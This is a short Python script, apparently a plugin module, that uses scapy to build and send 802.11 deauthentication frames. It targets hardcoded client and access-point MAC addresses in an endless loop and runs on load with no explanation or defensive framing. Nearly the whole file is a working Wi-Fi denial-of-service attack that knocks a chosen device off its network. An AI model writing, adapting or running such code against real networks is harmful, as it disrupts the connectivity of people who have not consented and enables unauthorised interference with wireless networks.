from scapy.all import *
from scapy.layers.dot11 import *

def init(host_socket):
    pass

def run(cmd):
    while True:
        deauth("b4:0b:1d:c4:71:ab", "00:1b:17:00:01:41")
        time.sleep(5)


def deauth(target_mac, gateway_mac, inter=0.1, count=None, loop=1, iface="Wi-Fi 7", verbose=1):
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    # stack them up
    deauth_packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    # send the packet
    sendp(deauth_packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)
    print("Deauthing...")

run(deauth)